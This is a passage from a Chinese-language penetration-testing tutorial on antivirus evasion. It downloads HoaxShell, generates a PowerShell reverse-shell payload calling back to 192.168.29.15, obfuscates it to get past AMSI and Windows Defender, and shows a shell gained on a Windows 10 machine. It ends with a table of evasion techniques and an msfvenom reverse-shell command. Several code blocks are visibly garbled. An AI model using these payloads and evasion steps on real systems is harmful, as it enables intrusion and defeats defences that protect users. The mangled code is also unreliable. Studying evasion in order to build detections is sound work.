
## 3. 在攻击者机器（Kali Linux）上下载 HoaxShell，使用 `wget` 命令

`https://github.com/t31machus/hoaxshell/archive/refs/heads/main.zip`，如图 9.20 所示：

```
(ummedeel@kali)~/Desktop
wget https://github.com/t31machus/hoaxshell/archive/refs/heads/main.zip
--2023-07-02 01:58:37-- https://github.com/t31machus/hoaxshell/archive/refs/heads/main.zip
Resolving github.com... 200
Connecting to github.com [142.250.190.46]:443--20.27.81:443 connected.
HTTP request sent, receiving... 302
Location: https://github.com/t31machus/hoaxshell/archive/refs/heads/main.zip [following]
--2023-07-02 01:58:38-- https://github.com/t31machus/hoaxshell/hoaxshell/archive/refs/heads/main.zip
Resolving github.com... 200
Connecting to github.com [142.250.190.46]:443--20.27.71:443 connected.
HTTP request sent, receiving... 200
Length: unspecified [application/zip]
Saving to: 'main.zip'
main.zip ==
--2023-07-02 01:58:39 (85.2 MB) -- 'main.zip' saved [307628]
```

图 9.20: 下载 HoaxShell

## 4. 进入 HoaxShell 文件夹并执行命令

`hoaxshell.py -s 192.168.29.15 -r "Authorization"` 生成反向 shell 载荷。最后，`hoaxshell` 将自动启动监听器，无需使用 `Netcat` 或 `Metasploit` 工具启动单独的监听器。见图 9.21：

```
(ummedeel@kali)~/Desktop/hoaxshell-main
$ python hoaxshell.py -s 192.168.29.15 -r "Authorization"
HOAXSHELL
reverse shell payload:
[INFO] Generating reverse shell payload...
[INFO] 192.168.29.15:4444 -> $client=New-Object System.Net.Sockets.TCPClient("192.168.29.15",4444);
$stream=$client.GetStream();
$reader=New-Object System.IO.StreamReader($stream);
$writer=New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush=$true;
while($true){
  $data=$reader.ReadLine();
  if($data -le $null){break}
  $writer.WriteLine("PS " + (env:pwd).path + ">> ");
  $tcp=Start-Process powershell.exe -Argument " "ExecutionPolicy Bypass -NoProfile -Window Hidden -Command \$($([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data))))" - -Wait -PassThru;
}
[INFO] Type "help" to get a list of the available prompt.
[INFO] Waiting for connection on port 4444...
[INFO] Awaiting payload execution to initiate session...
hoaxshell >
```

图 9.21: 生成反向 shell 载荷

## 5. 复制原始载荷脚本并进入测试 Windows 10 机器上的 AMSI Trigger 文件夹。创建一个文本文件，保存代码，并将其保存为 PowerShell 脚本 `.ps1`，如图 9.22 所示：

`此电脑 > 桌面 > AMSI Trigger`

| 名称 | 修改日期 | 类型 | 大小 |
| --- | --- | --- | --- |
| `AMSITrigger_x64.exe` | 2023/7/2 上午 11:17 | 应用程序 | 27 KB |
| `winpayload.ps1` | 2023/7/2 上午 11:33 | Windows PowerS... | 1 KB |

**图 9.22**: 复制原始载荷脚本到测试机器

在 `PowerShell` 中运行命令 `AMSITrigger_x64.exe -i \winpayload.ps1` 以验证脚本是否被 `AMSI` 触发。在这种情况下，它被检测到了。你可能需要临时禁用测试机器上的 `Windows Defender` 以保存载荷并进行必要的检查。见**图 9.23**

```
Windows PowerShell
Invoke-Expression -ScriptBlock (Get-Content \-AMSITrigger_x64.exe \winpayload.ps1)
$i='Headers = @{"Authorization:"$i}';$r='Invoke-RestMethod -Method Post -Body $1 $i|Out-String; $n=([System.Text.Encoding]::UTF8.GetString($r)).replace('79520a71','$');[System.IO.File]::WriteAllText('C:\Users\Unknown\mspayload.ps1')
```

**图 9.23**: 验证脚本是否被 AMSI 检测到

为了绕过安全检测，应用三种类型的修改：

- 首先，通过识别带有 `$` 符号的变量来修改变量，因为一切都代表变量。
- 其次，更改标准关键字的大小写，例如将它们从小写转换为大写。
- 第三，在任何命令的中间插入单引号（`''`）以破坏检测。

对原始载荷进行了多处更改。为了比较和增强理解，我们提供了原始代码和混淆后的代码，可以在**图 9.24** 中观察到它们。

原始脚本：

```
$=192.168.29.15:8080 -d0ad010c1-b8fa2-7950a7 -i -Invoke-WebRequest -UseBasicParsing -Uri
$s=d0ad010c1-b8fa2-Headers {"Authorization"};while($s){$s=Invoke-WebRequest -UseBasicParsing -Uri $s=d0ad010c1-b8fa2-Headers {"Authorization"}.Content;if($s.Content -ne 'None'){iex $s -ErrorAction Stop -Variable}
```

混淆脚本：

```
$=192.168.29.15:8080 -d0ad010c1-b8fa2-7950a7 -i -Invoke-WebRequest -UseBasicParsing -Uri
$s=d0ad010c1-b8fa2-Headers {"Authorization"};while($s){$s=Invoke-WebRequest -UseBasicParsing -Uri $s=d0ad010c1-b8fa2-Headers {"Authorization"}.Content;if($s.Content -ne 'None'){iex $s -ErrorAction Stop -Variable|Out-String\n[System.Text.Encoding]::UTF8.GetBytes($s)}
```

图 9.24: 原始与混淆代码

## 9. 将修改后的反向 shell 脚本到目标 Windows 10 机器。在 AMSI 文件夹中运行 `AMSITrigger_x64.exe -i \winpayload.ps1`，见图 9.26：

图 9.26: 运行修改后的反向 shell 脚本

## 10. 你已成功部署反向 shell 脚本到目标 Windows 10 机器。在 AMSI 文件夹中运行，见图 9.27：

```
[import] Initiating payload execution to initiate ...
[Shell] Payload execution verified!
[Shell] Stabilizing command ...
shell > hostname
DESKTOP-QOR
C:\Users\ummed> ls
```

| 模式 | 最后修改时间 | 名称 |
| --- | --- | --- |
| `d--r` | 2023/7/23 8:16 AM | `Contacts` |
| `d--r` | 2023/7/23 8:16 AM | `Desktop` |
| `d--r` | 2023/7/23 8:16 AM | `Documents` |
| `d--r` | 2023/7/22 上午 11:02 | `Downloads` |

图 9.27: 获取反向 shell

> **注意**：像 `HoaxShell` 一样，黑网上有很多开源和工具。然而，一旦这些工具或脚本出现，杀毒公司会迅速更新签名数据库和行为规则进行控制。因此，曾经有效的技术可能会失效，导致研究人员不断开发新技术。

## 杀毒规避技术和工具

杀毒规避包括恶意活动利用复杂的方法和技术来避免检测并绕过杀毒软件。主要目标是使杀毒程序难以识别或分析恶意代码或文件。

## 杀毒规避技术

杀毒软件利用基于签名、基于启发和基于行为的检测技术来识别和防止恶意。基于签名的匹配已知恶意，基于启发的分析潜在有害载荷，基于行为监控执行行为。这些技术协同防御恶意并确保系统安全。为了绕过这些检测方法，渗透测试使用各种杀毒规避技术，见表 9.1：

| 技术 | 描述 |
| --- | --- |
| 混淆 | 使用加密、随机化和操作修改代码结构，使其更难检测。 |
| 多态 | 生成具有相同功能的多个代码变体以规避签名的检测。 |
| 变态 | 每次感染都更改代码和行为，使杀毒程序难以识别。 |
| 包裹和加密 | 压缩或加密恶意软件以隐藏其真实本质并防止于分析。 |
| 根内核 | 篡改系统函数或 `API` 以隐藏恶意活动和进程。 |
| 零日漏洞 | 在杀毒厂商开发出相应的签名或更新之前，利用未知漏洞。 |

表 9.1: 杀毒规避技术

# 基准载荷 (Baseline payload)

1. 为了建立基准，我们将使用命令 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.29.15 LPORT=4444 -f exe basepayload.exe` 为 32 位 Windows 系统生成标准的反向 shell 负载，如图 9.28 所示：
